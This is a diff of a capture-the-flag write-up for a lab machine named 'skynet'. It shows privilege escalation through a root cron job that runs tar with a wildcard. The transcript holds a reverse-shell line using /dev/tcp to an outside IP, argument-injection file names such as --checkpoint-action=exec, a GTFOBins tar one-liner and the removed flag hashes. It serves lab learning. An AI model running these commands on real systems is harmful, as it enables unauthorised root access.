@@ -254,8 +254,9 @@ Exploiting 25971
 
 ## Movement
 
-	www-data@skynet:/$ cd /home/milesdyson
-	www-data@skynet:/home/milesdyson$ ls -la
+www-data@skynet:/$ cd /home/milesdyson
+www-data@skynet:/home/milesdyson$ ls -la
+		
 		lrwxrwxrwx 1 root       root          9 Sep 17  2019 .bash_history -> /dev/null
 		-rw-r--r-- 1 milesdyson milesdyson  220 Sep 17  2019 .bash_logout
 		-rw-r--r-- 1 milesdyson milesdyson 3771 Sep 17  2019 .bashrc
@@ -264,14 +265,13 @@ Exploiting 25971
 		drwx------ 3 milesdyson milesdyson 4096 Sep 17  2019 mail
 		drwxr-xr-x 3 milesdyson milesdyson 4096 Sep 17  2019 share
 		-rw-r--r-- 1 milesdyson milesdyson   33 Sep 17  2019 user.txt
-	www-data@skynet:/home/milesdyson$ cat user.txt
 
-*Flag Found*<details>
-	<summary>Spoiler</summary>
-		7ce5c2109a40f958099283600a9ae807
-</details>
+www-data@skynet:/home/milesdyson$ cat user.txt
 
-	www-data@skynet:/home/milesdyson$ cat /etc/crontab
+	Flag Found
+
+www-data@skynet:/home/milesdyson$ cat /etc/crontab
+		
 		SHELL=/bin/sh
 		PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 
@@ -282,12 +282,14 @@ Exploiting 25971
 		47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
 		52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
 	
-	www-data@skynet:/home/milesdyson$ ls -la backups
+www-data@skynet:/home/milesdyson$ ls -la backups
+		
 		-rwxr-xr-x 1 root       root            74 Sep 17  2019 backup.sh
 		-rw-r--r-- 1 root       root       4679680 Sep  4 18:46 backup.tgz
 
-	www-data@skynet:/home/milesdyson/backups$ cd backups
-	www-data@skynet:/home/milesdyson/backups$ cat backup.sh
+www-data@skynet:/home/milesdyson/backups$ cd backups
+www-data@skynet:/home/milesdyson/backups$ cat backup.sh
+		
 		#!/bin/bash
 		cd /var/www/html
 		tar cf /home/milesdyson/backups/backup.tgz *
@@ -301,7 +303,7 @@ Looking on GTFOBins for tar privesc
 
 > tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh'
 
-	www-data@skynet:/home/milesdyson/backups$ printf '#!/bin/bash\nbash -i >& /dev/tcp/10.10.192.149/9000 0>&1' > /var/www/html/shell
+	www-data@skynet:/home/milesdyson/backups$ printf '#!/bin/bash\nbash -i >& /dev/tcp/$MYIP/9000 0>&1' > /var/www/html/shell
 	www-data@skynet:/home/milesdyson/backups$ chmod +x /var/www/html/shell
 	www-data@skynet:/home/milesdyson/backups$ touch /var/www/html/--checkpoint=1
 	www-data@skynet:/home/milesdyson/backups$ touch /var/www/html/--checkpoint-action=exec=bash\ shell
@@ -312,19 +314,20 @@ Starting listener on port 9000
 
 ## Caught root session!
 
-	root@skynet:/var/www/html# pwd;whoami;id
+root@skynet:/var/www/html# pwd;whoami;id
+		
 		/var/www/html
 		root
 		uid=0(root) gid=0(root) groups=0(root)
-	root@skynet:/var/www/html# cd ~
-	root@skynet:~# ls
+
+root@skynet:/var/www/html# cd ~
+root@skynet:~# ls
+		
 		root.txt
-	root@skynet:~# cat root.txt
+
+root@skynet:~# cat root.txt
 	
-*Flag Found*<details>
-	<summary>Spoiler</summary>
-		3f0372db24753accc7179a282cd6a949
-</details>
+	Flag Found
 
 # Passwords
 
